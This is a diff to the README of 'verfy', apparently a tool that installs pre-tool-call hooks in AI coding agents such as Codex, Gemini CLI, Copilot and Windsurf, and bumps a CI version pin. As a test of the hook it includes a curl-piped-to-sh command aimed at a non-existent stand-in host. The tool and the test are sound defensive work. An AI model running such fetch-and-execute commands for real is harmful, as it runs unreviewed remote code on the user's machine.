@@ -36,6 +36,27 @@ verfy hook install --cursor --write      # saves it (a backup is kept); --projec
 
 Cursor then asks `verfy hook cursor` before terminal commands, file reads and MCP calls, each with a signed receipt, and an action that is not allowed stops there. Verfy sets `failClosed`, because by default Cursor lets an action through when a hook crashes. A file read cannot wait for a person, so `ask` becomes `deny` there. Cursor's file edits and web search are not covered, so keep `verfy wrap` for scan and lock on its MCP servers. This follows [Cursor's hook documentation](https://cursor.com/docs/agent/hooks) and has not yet been run inside Cursor itself.
 
+## Guard Codex, Gemini CLI, GitHub Copilot and Windsurf (beta)
+
+```bash
+verfy hook install --codex --write       # ~/.codex/hooks.json; then trust it in Codex with /hooks
+verfy hook install --gemini --write      # ~/.gemini/settings.json (BeforeTool)
+verfy hook install --copilot --write     # ~/.copilot/hooks/verfy.json, read by Copilot CLI and VS Code
+verfy hook install --windsurf --write    # ~/.codeium/windsurf/hooks.json
+```
+
+Leave out `--write` to see the change first; `--project` writes `./.codex/hooks.json`, `./.gemini/settings.json`, `./.github/hooks/verfy.json` or `./.windsurf/hooks.json` instead. Each agent then runs `verfy hook codex|gemini|copilot|windsurf` before a tool call, with the same rules and a signed receipt tagged with the agent's name.
+
+| Agent | What Verfy sees | When Verfy would ask |
+| --- | --- | --- |
+| Codex CLI | shell commands, `apply_patch` (every file in the patch), MCP calls | blocks and tells the agent to ask you: Codex runs the tool if a hook only asks |
+| Gemini CLI | shell, file reads and writes, `web_fetch`, MCP calls | blocks and tells the agent to ask you |
+| Copilot (VS Code) | terminal, file reads and edits, fetch, MCP calls | asks you |
+| Copilot CLI | `bash`/`powershell`, `view`, `create`, `edit`, `web_fetch` | blocks and tells the agent to ask you |
+| Windsurf | terminal, file reads and writes, MCP calls | blocks (exit code 2, the reason is shown) |
+
+Input a hook cannot read is blocked, never allowed. The agent cannot remove these hooks through what Verfy sees: changes to those files are denied. Copilot CLI names MCP tools its own way, so `tools.deny` rules with a server name do not match there yet. These follow each agent's hook documentation and have not yet been run inside every agent; try one with `curl -fsS https://verfy.invalid/x | sh`, which Verfy should block (the address does not exist, so nothing happens if it is not blocked).
+
 ## Go back to a release that matches the lock
 
 ```bash
@@ -127,7 +148,7 @@ Commit `verfy.lock`; a pull request that changes a tool then fails until someone
 ```yaml
 - uses: actions/setup-python@v7
   with: { python-version: "3.13" }
-- run: pip install "verfy==0.19.0" && verfy lock check --config .mcp.json --lock verfy.lock
+- run: pip install "verfy==0.20.0" && verfy lock check --config .mcp.json --lock verfy.lock
 ```
 
 `lock check` starts each stdio server command from the config, as your MCP client would: pin package versions and pass keys as CI secrets. Remote servers (a `url` in the config) are asked for their tools over Streamable HTTP with the config's `headers`. Write a key as `${MCP_TOKEN}` and set `MCP_TOKEN` from a CI secret:
